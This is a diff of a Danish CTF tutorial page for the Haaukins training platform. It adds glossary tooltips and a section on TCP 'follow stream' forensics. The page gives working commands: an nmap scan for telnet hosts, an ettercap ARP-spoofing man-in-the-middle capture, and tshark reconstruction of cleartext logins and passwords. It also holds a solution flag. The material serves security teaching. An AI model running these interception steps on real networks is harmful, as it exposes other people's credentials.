@@ -28,13 +28,13 @@
              bagefter.</p>
 <h2>Trin for trin</h2>
 <ol class="steps">
-             <li>Find serveren: <code>sudo nmap -Pn -p23 --open &lt;subnet&gt;/24</code>.</li>
+             <li>Find serveren: <code>sudo <span class="gloss" tabindex="0" data-tip="Netværksscanner — finder åbne porte og services på en host.">nmap</span> -Pn -p23 --open &lt;subnet&gt;/24</code>.</li>
              <li>MITM + gem trafikken til en pcap:
              <pre><code>sudo sysctl -w net.ipv4.ip_forward=1
-sudo ettercap -T -q -i eth0 -M arp:remote -w /tmp/telnet.pcap /&lt;server&gt;// ///</code></pre>
+sudo <span class="gloss" tabindex="0" data-tip="ARP-spoofing/MITM-værktøj til at opsnappe trafik på et lokalt netværk.">ettercap</span> -T -q -i eth0 -M arp:remote -w /tmp/telnet.pcap /&lt;server&gt;// ///</code></pre>
              Lad køre til et login sker, tryk <code>q</code>.</li>
              <li>Genopbyg sessionen som læsbar tekst:
-             <pre><code>for i in 0 1 2 3; do tshark -r /tmp/telnet.pcap -q -z follow,tcp,ascii,$i; done</code></pre></li>
+             <pre><code>for i in 0 1 2 3; do <span class="gloss" tabindex="0" data-tip="Kommandolinje-udgaven af Wireshark — filtrerer og læser pcap-trafik.">tshark</span> -r /tmp/telnet.pcap -q -z follow,tcp,ascii,$i; done</code></pre></li>
              </ol>
              <p>Telnet-forhandlingsbytes (IAC) ses som støj — ignorér dem; login og kommandoer er læsbare.</p>
 <details class="spoiler"><summary>🚩 Vis løsning &amp; eksempel-flag</summary>
@@ -43,7 +43,12 @@ sudo ettercap -T -q -i eth0 -M arp:remote -w /tmp/telnet.pcap /&lt;server&gt;// 
         <p>Flag (eksempel): <span class="flag">HKN{zeS-Ms-CFTuS}</span></p>
 </details>
 <h2>Hvad du har lært</h2>
-<ul><li><code>ettercap -w fil.pcap</code> gemmer trafikken mens den MITM'er.</li><li><code>tshark -z follow,tcp,ascii,N</code> genopbygger en klartekst-session.</li><li>Telnet krypterer intet — hele sessionen inkl. password ligger åbent.</li></ul>
+<ul><li><code>ettercap -w fil.pcap</code> gemmer trafikken mens den MITM'er.</li><li><code>tshark -z follow,tcp,ascii,N</code> genopbygger en klartekst-session.</li><li>Telnet krypterer intet, hele sessionen inkl. password ligger åbent.</li></ul>
+<h2>Hvor ses dette igen?</h2>
+<p>"Følg strømmen" er en af de mest universelle forensics-bevægelser. Den virker på enhver
+tekst-baseret, ukrypteret TCP-protokol: telnet, FTP-kommandokanalen, ren HTTP, SMTP, IRC, og
+mange IoT-protokoller. Når du har en pcap og ser en TCP-session til en kendt klartekst-port, er
+"follow stream" næsten altid det første du skal gøre, før du graver i enkeltpakker.</p>
 <footer>
 Del af <a href="index.html">Haaukins CTF-tutorials</a>. <a href="https://www.haaukins.dk/" target="_blank">Haaukins</a>
 er en dansk undervisningsplatform til sikkerhedstræning (AAU / De Danske Cybermesterskaber) — alle opgaver
